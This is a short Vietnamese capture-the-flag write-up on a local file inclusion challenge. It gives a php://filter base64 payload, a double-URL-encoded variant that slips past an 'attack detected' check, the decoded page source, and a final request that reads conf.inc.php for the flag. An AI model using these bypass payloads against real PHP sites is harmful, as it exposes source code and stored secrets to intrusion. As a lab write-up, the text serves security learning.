Bài này cũng là dạng LFI, vì bài trước cung cấp cho chúng ta 1 cách exploit rất hữu hiệu là dùng `php wrapper`, vậy bài này chúng ta cũng làm tương tự: truy cập vào đường dẫn 

`?page=php://filter/convert.base64-encode/resource=home`

thì 1 thông báo `attack detected` văng ra

Lấy tiêu đề làm hint, double encoding url trên:

`?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome`

thành công rồi!. Base64 decode kết quả:

```php
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>
```

tương tự với page cv, contact, đều thấy 1 dòng `include("conf.inc.php");`

ở đầu. Vậy khả năng cao tất cả thông tin của ông Smith này nằm trong file đó. Sửa lại đường dẫn:

`?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

base64decode kết quả, ta sẽ có flag nằm trong file

